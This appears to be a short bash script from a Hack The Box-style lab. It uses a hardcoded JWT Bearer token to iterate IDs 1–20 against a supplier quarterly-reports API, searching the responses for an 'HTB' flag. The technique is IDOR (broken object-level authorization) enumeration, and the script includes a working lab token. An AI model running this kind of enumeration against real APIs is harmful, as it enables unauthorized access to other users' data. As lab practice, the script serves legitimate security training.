#!/bin/bash

for i in {1..20}; do
    request=$(curl -s -w "\n" -X 'GET' \
    'http://94.237.63.90:33190/api/v1/suppliers/quarterly-reports/'$i'' \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer     eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc0MDk0MDUyNCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.Zzq4-aDE31bNhnDPoaY0RHxTkZz-kA_kWF-9-yG6VX5-11cgU7hIy60VyymEJCHzry925A0x3-F7PWuXuwTxxA' | jq)
    echo "$i"
    if echo "$request" | grep "HTB"; then
       echo "$request"
       exit 0
    fi 
done
